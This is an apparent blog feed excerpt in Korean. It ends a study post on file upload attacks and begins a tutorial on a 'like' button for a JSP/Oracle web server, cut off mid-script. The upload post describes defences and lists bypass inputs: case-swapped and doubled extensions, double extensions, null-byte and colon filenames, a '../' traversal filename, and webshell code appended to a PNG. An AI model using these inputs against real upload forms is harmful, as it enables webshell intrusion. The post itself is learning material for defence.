</ul>

<h3 id="reverse-shelll">Reverse Shelll</h3>
<ul>
  <li>웹 서버에서 공격자의 특정 포트와 연결하는 공격이다.</li>
  <li>방화벽으로 외부(공격자)에서 서버로 들어오는 요청은 잘 막혀있다. ( ip and port number )</li>
  <li>하지만 서버에서 외부(공격자) 즉 나가는 포트는 잘 안막혀 있다. 왜냐하면 외부 API가 어떤 포트를 사용하는지 모르기 때문이다. 443 ( https ) 포트는 항상 열려있을 가능성이 높다.</li>
</ul>

<h3 id="deface-공격">Deface 공격</h3>
<ul>
  <li>화면 변조 공격이다.</li>
  <li>공격자가 웹 서버를 마음로 바꾸고 해킹을 성공했음을 알리는 공격이다. 해킹을 성공했다는 실력 과시로 활용된다.</li>
  <li>해당 공격을 당했을 때 서버의 피해는 심각하지 않다. 하지만 웹 서버의 보안이 취약하다는 뜻이다.</li>
</ul>

<h2 id="file-upload-공격-방어법">File Upload 공격 방어법</h2>

<h3 id="파일-업로드-위치">파일 업로드 위치</h3>
<ul>
  <li>파일 업로드 위치를 웹 서버와 물리적으로 분리시켜 준다.</li>
  <li>공격자는 웹 링크를 통해 서버에 업로드한 파일에 접속할 수 없다.</li>
</ul>

<h3 id="업로드-폴더-실행-막기">업로드 폴더 실행 막기</h3>
<ul>
  <li>특정 폴더에서 웹 서버에서 실행되는 코드의 실행을 막는 것이다.</li>
  <li>공격자가 업로드한 파일( 웹쉘 )에 링크를 통해 직접적으로 접근이 가능해도 서버측에서는 해당 파일을 실행하지 않고 파일 내용 그대로를 보여주게 된다.</li>
</ul>

<h3 id="웹-서버-계정-접근-권한">웹 서버 계정 접근 권한</h3>
<ul>
  <li>웹 서버 계정의 접근 권한을 제한하기.</li>
  <li>외부에서 웹 쉘 공격을 성공하여도 웹 계정은 접근 권한이 없어 다른 곳으로 접근을 못한다.</li>
</ul>

<h3 id="content-type-검사">Content-Type 검사</h3>
<ul>
  <li>서버에서 업로드 파일의 업로드 요청이 올 때 <strong>Content-Type</strong>을 검사하여 서버에 저장하여도 괜찮은 파일인지 확인한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php 파일
content-type: text/php

이미지 파일
content-type: image/jpeg
</code></pre></div></div>

<h3 id="확장자-필터링">확장자 필터링</h3>
<ul>
  <li>서버에서 허용되지 않은 확장자 파일이 업로드 되면 서버에 저장하지 않는다. 즉 업로드에 실패하게 된다.</li>
  <li>예를들어 파일 확장자가 <code class="language-plaintext highlighter-rouge">.jpeg</code> , <code class="language-plaintext highlighter-rouge">.png</code> 인 것만 서버 저장을 허용 한다고 설정하는 것이다.</li>
</ul>

<h3 id="file-시그니쳐-검사">File 시그니쳐 검사</h3>
<ul>
  <li>업로드된 파일의 시그니처를 검사하여 허용된 파일 인지 아닌지 확인한다. 이런 확인을 통해 허용된 파일이면 서버에 저장하고 허용되지 않은 파일이면 저장하지 않는다.</li>
</ul>

<h2 id="방어법-bypass">방어법 Bypass</h2>

<h3 id="content-type-바꾸기">Content-Type 바꾸기</h3>
<ul>
  <li>직접 content-type을 서버에서 허용하는 값으로 바꾸어 서버에서 정상적인 파일이 업로드되고 있다고 생각하게 한다.</li>
  <li>burp-suite의 intercept 기능을 이용하여 실제 업로드 하는 파일은 이미지가 아니지만 content-type을 공격자가 임의로 변경하여 정상적인 이미지 파일을 업로드하는 것으로 서버를 속일 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/72120adb-5190-48a9-a615-b77f644698b4" alt="Pasted image 20230605174255" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3358a51e-29ad-4bad-90df-16379e7d796d" alt="Pasted image 20230605174427" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/56ade12a-3454-47f8-9acf-58be232d8b35" alt="Pasted image 20230605174447" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0f9dd0c8-2173-4141-9aa4-9e2afab9ab6a" alt="Pasted image 20230605174534" /></li>
</ul>

<h3 id="traversal">Traversal</h3>
<ul>
  <li>파일이 업로드되는 경로를 사용자가 임의로 바꾼다.</li>
  <li>만약 서버가 업로드 폴더에 저장된 업로드 파일 실행이 안되게 막아 놓는다면 공격자는 업로드 폴더에 바로 접근이 가능하더라도 웹 쉘 공격을 성공시킬 수 없다.</li>
  <li>업로드 파일 이름을 바꾸어 파일 저장 위치를 공격자가 임의로 바꾼다. 공격자가 링크를 통해 바로 접근가능 하면서 파일 실행이 되는 임의의 위치로 설정한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>업로드 파일 이름
test.img

traversal 을 이용한 파일 이름
../test.img
</code></pre></div></div>

<ul>
  <li>
    <p>정상적으로 파일 업로드 하였을 때 파일 저장 위치.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c4d514ea-6685-4089-be49-c216697604c1" alt="Pasted image 20230605183831" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/53f07950-06a8-426d-afb5-054230bb1628" alt="Pasted image 20230605183720" /></p>
  </li>
  <li>
    <p>파일 이름을 변경하여 임의로 업로드 위치 바꾸기. 저장되면 원래 위치의 하위 폴더에 공격자가 업로드한 파일이 저장되었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/63ff038d-b4bb-41cd-947d-3f57f0d6037f" alt="Pasted image 20230605183905" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2519f6cf-7952-4d70-b0b2-df817bb16c94" alt="Pasted image 20230605184010" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b863d87-6983-4aa4-90fc-c50ea70622ab" alt="Pasted image 20230605184041" /></p>
  </li>
</ul>

<h3 id="블랙리스트-기반-필터링-우회">블랙리스트 기반 필터링 우회</h3>
<ul>
  <li>필터링 처리되어 있는 단어를 대소문자로 바꿔가며 우회되는지 확인한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php 가 필터링 처리되어 있으면
pHp
PhP
pHP

jsp
Jsp
jsP
JsP
</code></pre></div></div>

<ul>
  <li>필터링으로 설정된 단어를 빈칸으로 변경하는 서버에서는 필터링 단어를 한번더 써주어 우회를 시도한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phphpp =&gt; php
</code></pre></div></div>

<h3 id="확장자-우회-방법">확장자 우회 방법</h3>
<ul>
  <li>서버가 앞에서 부터 확장자를 검사할 때.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test.jpeg.php
</code></pre></div></div>

<ul>
  <li>서버가 뒤에서 부터 확장자를 검사할 때. null 바이트를 이용하기.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%00 : null 바이트
test.php%00.jpeg : 리눅스

test.php:.jpeg : 윈도우
</code></pre></div></div>

<ul>
  <li>다른 확장자명 사용하기.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php &gt; .php5
jsp &gt; .jspx ( .jsp 와 문법이 다르다. )
</code></pre></div></div>

<h3 id="file-시그니처-우회방법">File 시그니처 우회방법</h3>
<ul>
  <li>허용된 파일 내용 맨뒤에 웹쉘 코드를 넣어주기. 즉 이미지 안에 웹쉘 코드를 넣는 것이다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~PNG
....

웹 쉘 코드 넣기.
</code></pre></div></div>

<h2 id="후기">후기</h2>
<ul>
  <li>파일 업로드 취약점이 무엇인지 관하여 알아보았고, 파일 업로드 취약점을 이용한 공격이 어떠한 것들이 있는지 알아보았다. 방어법과 방어법 우회 방법도 알아보았다. 리버스 쉘과 deface 라는 처음보는 공격방식에 대하여 알아보는 좋은 계기가 되었다.</li>
  <li>파일 업로드 공격을 정리하면서 내가 만든 웹 서버의 파일 업로드 부분에 취약점이 있는지 확인해 보았다. 파일 업로드 부분에 취약점이 없을 줄 알았지만 Traversal 우회기법을 사용하여 업로드 파일 저장위치를 변경할 수 있는 취약점을 발견할 수 있었다. 따라서 다음 글에는 이 취약점을 이용하여 deface 공격 이나 리버스쉘 공격을 실습을 통해 정리해볼 예정이다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://mokpo.tistory.com/355">Null byte (tistory.com)</a></li>
  <li><a href="https://www.boannews.com/media/view.asp?idx=55936">왕초보를 위한 용어 풀이, 디페이스(Deface) 공격이란? (boannews.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="file upload" /><category term="웹쉘" /><summary type="html"><![CDATA[File Upload 공격에 대하여 자세히 알아보자.]]></summary></entry><entry><title type="html">웹 서버 만들기(15) 게시글 좋아요 및 정렬 기능 만들기</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15/" rel="alternate" type="text/html" title="웹 서버 만들기(15) 게시글 좋아요 및 정렬 기능 만들기" /><published>2023-06-04T00:00:00+09:00</published><updated>2023-06-04T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C15/"><![CDATA[<h2 id="서버-환경">서버 환경</h2>
<ul>
  <li>oracle db 서버</li>
  <li>우분투 22.04.2 LTS 웹 nginx 서버</li>
  <li>tomcat WAS</li>
</ul>

<h2 id="like-기능--좋아요-기능--만들기">Like 기능 ( 좋아요 기능 ) 만들기</h2>

<h3 id="설명">설명</h3>
<ul>
  <li>사용자가 게시글의 <code class="language-plaintext highlighter-rouge">좋아요</code> 버튼을 누르면 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블에 사용자 sid 와 게시글 sid 가 같이 저장된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2837bbf8-b61d-4a7f-8bc3-af2c7af4189b" alt="Pasted image 20230603233541" /></li>
  <li>게시글을 삭제하기전 likes 테이블에서 게시글과 관련된 데이터를 먼저 삭제해줘야 한다. 바로 게시글 삭제를 시도하면 무결성을 위배되었다는 오류가 발생한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/09c3fdd9-24ac-4ed5-94e0-8c6a7a3aa598" alt="Pasted image 20230603155100" /></li>
</ul>

<h3 id="db-likes-테이블">DB <code class="language-plaintext highlighter-rouge">likes</code> 테이블</h3>

<h4 id="만들기">만들기</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 정보를 저장하기 위한 테이블을 만들어 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b7beb57c-95f6-4db7-a391-1c737d769d9b" alt="Pasted image 20230603233549" /></li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">create</span> <span class="k">table</span> <span class="n">likes</span><span class="p">(</span>
	<span class="n">user_sid</span> <span class="n">NUMBER</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
	<span class="n">notice_board_sid</span> <span class="n">NUMBER</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
	<span class="k">foreign</span> <span class="k">key</span> <span class="p">(</span><span class="n">user_sid</span><span class="p">)</span> <span class="k">references</span> <span class="n">users</span> <span class="p">(</span><span class="n">sid</span><span class="p">),</span>
	<span class="k">foreign</span> <span class="k">key</span> <span class="p">(</span><span class="n">notice_board_sid</span><span class="p">)</span> <span class="k">references</span> <span class="n">notice_board</span> <span class="p">(</span><span class="n">sid</span><span class="p">),</span>
	<span class="k">primary</span> <span class="k">key</span> <span class="p">(</span><span class="n">user_sid</span><span class="p">,</span> <span class="n">notice_board_sid</span><span class="p">)</span>
<span class="p">);</span>
</code></pre></div></div>

<h4 id="데이터-갯수">데이터 갯수</h4>
<ul>
  <li>게시글 좋아요 수 계산하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">where</span> <span class="n">notice_board_sid</span><span class="o">=</span><span class="n">yy</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="사용자-좋아요-여부-확인">사용자 좋아요 여부 확인</h4>
<ul>
  <li>사용자가 <code class="language-plaintext highlighter-rouge">좋아요</code> 눌렀는지 안눌렀는지 확인한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">where</span> <span class="n">user_sid</span><span class="o">=</span><span class="n">xx</span> <span class="k">and</span> <span class="n">notice_board_sid</span><span class="o">=</span><span class="n">yy</span><span class="p">;</span>
</code></pre></div></div>

<h4 id="데이터-입력">데이터 입력</h4>
<ul>
  <li>사용자가 게시글 <code class="language-plaintext highlighter-rouge">좋아요</code> 눌렀을 때.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">insert</span> <span class="k">into</span> <span class="n">likes</span> <span class="p">(</span><span class="n">user_sid</span><span class="p">,</span> <span class="n">notice_board_sid</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="n">xx</span><span class="p">,</span> <span class="n">yy</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="데이터-삭제">데이터 삭제</h4>
<ul>
  <li><code class="language-plaintext highlighter-rouge">likes</code> 테이블 데이터 부터 삭제 안하면 무결성 위배 오류가 발생한다.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- 사용자가 좋아요 취소할 때 or 사용자 계정이 없어질 때</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">where</span> <span class="n">user_sid</span><span class="o">=</span><span class="n">xx</span><span class="p">;</span>

<span class="c1">-- 게시글 삭제할 때</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">where</span> <span class="n">notice_board_sid</span><span class="o">=</span><span class="n">yy</span><span class="p">;</span>

<span class="c1">-- 사용자 좋아요 취소</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">where</span> <span class="n">user_sid</span><span class="o">=</span><span class="n">xx</span> <span class="k">and</span> <span class="n">notice_board_sid</span><span class="o">=</span><span class="n">yy</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="좋아요-버튼-jsp">좋아요 버튼 JSP</h3>
<ul>
  <li>클릭하면 <code class="language-plaintext highlighter-rouge">좋아요</code>가 해제 또는 선택된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/500e5b28-2539-4f4c-af6f-3097e8872d02" alt="Pasted image 20230603182159" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/95419c6c-8eb8-4f77-b72c-eb163367604c" alt="Pasted image 20230603182036" /></li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 버튼을 누르면 db의 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블에 저장된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/19598193-a0b1-4ed3-8ab4-a86641299466" alt="Pasted image 20230603233443" /></li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 를 취소하면 <code class="language-plaintext highlighter-rouge">좋아요</code> 테이블에서 삭제된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a1db1caa-8408-4fc9-86d5-27b72e9a084b" alt="Pasted image 20230603233503" /></li>
</ul>

<h4 id="noticejsp">notice.jsp</h4>
<ul>
  <li>하트 모양의 <code class="language-plaintext highlighter-rouge">좋아요</code> 버튼을 만들었다.</li>
  <li>class 명을 바꾸면 하트색이 바뀐다.</li>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code> 수를 볼 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/df7cb6bb-6f42-4caf-98a1-07a20355f807" alt="Pasted image 20230604001643" /></li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span>
<span class="nc">.heart</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">width</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">height</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">background</span><span class="p">:</span> <span class="m">#ea2027</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">transform</span><span class="p">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">45deg</span><span class="p">);</span>
<span class="p">}</span>
<span class="nc">.heart</span><span class="nd">::before</span><span class="o">,</span><span class="nc">.heart</span><span class="nd">::after</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">content</span><span class="p">:</span> <span class="s1">""</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">width</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">height</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">border-radius</span><span class="p">:</span> <span class="m">50%</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">background</span><span class="p">:</span> <span class="m">#ea2027</span><span class="p">;</span>
<span class="p">}</span>
<span class="nc">.heart</span><span class="nd">::before</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">left</span><span class="p">:</span> <span class="m">-50%</span><span class="p">;</span>
<span class="p">}</span>
<span class="nc">.heart</span><span class="nd">::after</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">top</span><span class="p">:</span> <span class="m">-50%</span><span class="p">;</span>
<span class="p">}</span>

<span class="nc">.heart-no</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">width</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">height</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">background</span><span class="p">:</span> <span class="m">#e0e0e0</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">transform</span><span class="p">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">45deg</span><span class="p">);</span>
<span class="p">}</span>
<span class="nc">.heart-no</span><span class="nd">::before</span><span class="o">,</span><span class="nc">.heart-no</span><span class="nd">::after</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">content</span><span class="p">:</span> <span class="s1">""</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">width</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">height</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">border-radius</span><span class="p">:</span> <span class="m">50%</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">background</span><span class="p">:</span> <span class="m">#e0e0e0</span><span class="p">;</span>
<span class="p">}</span>
<span class="nc">.heart-no</span><span class="nd">::before</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">left</span><span class="p">:</span> <span class="m">-50%</span><span class="p">;</span>
<span class="p">}</span>
<span class="nc">.heart-no</span><span class="nd">::after</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nl">top</span><span class="p">:</span> <span class="m">-50%</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>

<span class="nt">&lt;div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"heart"</span> <span class="na">style=</span><span class="s">"float: left;"</span> <span class="na">class=</span><span class="s">"heart-no"</span> <span class="na">onclick=</span><span class="s">"heartClick()"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;span</span> <span class="na">style=</span><span class="s">"margin-left: 10px;"</span><span class="nt">&gt;</span>0<span class="nt">&lt;/span&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">좋아요</code>  버튼이 클릭되면 <code class="language-plaintext highlighter-rouge">heartClick()</code> 스크립트 함수로 넘어간다. 그리고 이 함수에서 서버로 <code class="language-plaintext highlighter-rouge">좋아요</code> 클릭 또는 해제 상태와 게시글 id를 파라미터에 넣어 서버로 POST 요청을 하게 된다.</li>
  <li>fetch 함수를 이용하여 POST 요청을 보낸다.</li>
  <li>서버의 응답으로는 현재 사용자의 <code class="language-plaintext highlighter-rouge">좋아요</code> 상태와 현재까지 눌린 <code class="language-plaintext highlighter-rouge">좋아요</code> 수를 json 형태로 받게된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4ca84e25-51bb-4e47-8fb0-ac7008a05b39" alt="Pasted image 20230603235651" /></li>
  <li>‘true’ 를 응답으로 받으면 현재 사용자는 <code class="language-plaintext highlighter-rouge">좋아요</code>를 클릭한 상태이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/95419c6c-8eb8-4f77-b72c-eb163367604c" alt="Pasted image 20230603182036" /></li>
  <li>‘false’ 를 응답으로 받으면 현재 사용자는 <code class="language-plaintext highlighter-rouge">좋아요</code>를 안 클릭한 상태이다.<br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/500e5b28-2539-4f4c-af6f-3097e8872d02" alt="Pasted image 20230603182159" /></li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">heart</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span> <span class="c1">// TODO</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">likes</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">},</span>
<span class="err"> </span> <span class="err"> </span> <span class="na">body</span><span class="p">:</span> <span class="nf">postPrameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">confirm</span><span class="dl">"</span><span class="p">)</span>
<span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">json</span> <span class="o">=&gt;</span> <span class="nf">jsonFunc</span><span class="p">(</span><span class="nx">json</span><span class="p">));</span>

<span class="kd">function</span> <span class="nf">heartClick</span><span class="p">(){</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">if</span><span class="p">(</span><span class="nx">heart</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 좋아요 취소</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 서버에 좋아요 취소 요청 보내기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">likes</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">},</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="na">body</span><span class="p">:</span> <span class="nf">postPrameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">false</span><span class="dl">"</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">json</span> <span class="o">=&gt;</span> <span class="nf">jsonFunc</span><span class="p">(</span><span class="nx">json</span><span class="p">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 좋아요!</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 서버에 좋아요 요청 보내기.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">likes</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">},</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="na">body</span><span class="p">:</span> <span class="nf">postPrameter</span><span class="p">(</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nf">then</span><span class="p">(</span><span class="nx">json</span> <span class="o">=&gt;</span> <span class="nf">jsonFunc</span><span class="p">(</span><span class="nx">json</span><span class="p">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="p">}</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">postPrameter</span><span class="p">(</span><span class="nx">s</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="kd">var</span> <span class="nx">re</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">like=</span><span class="dl">"</span><span class="o">+</span><span class="nx">s</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;pageid=</span><span class="nt">&lt;%=</span><span class="n">notice</span><span class="o">.</span><span class="na">getSid</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="dl">"</span><span class="p">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="nx">re</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">jsonFunc</span><span class="p">(</span><span class="nx">json</span><span class="p">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// console.log(json.result);</span>
<span class="err"> </span> <span class="err"> </span> <span class="c1">// console.log(json.likecount);</span>
